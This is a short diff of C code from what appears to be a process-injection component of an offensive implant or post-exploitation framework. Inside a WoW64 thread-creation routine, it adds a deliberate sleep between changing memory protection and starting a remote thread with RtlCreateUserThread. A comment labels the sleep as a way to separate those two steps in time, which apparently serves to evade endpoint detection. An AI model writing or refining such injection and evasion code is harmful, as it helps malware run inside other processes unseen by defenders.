@@ -182,6 +182,9 @@ HANDLE ThreadCreateWoW64(
         goto END;
     }
 
+    /* HVC-046: dissociate protect->execute in time */
+    ExecDelaySleep();
+
     PUTS( "calling RtlCreateUserThread( ctx->h.hProcess, NULL, TRUE, 0, NULL, NULL, ctx->s.lpStartAddress, ctx->p.lpParameter, &ctx->t.hThread, NULL ) on x64 context" )
     if( ! pExecuteX64( pX64function, &ctx ) )
     {
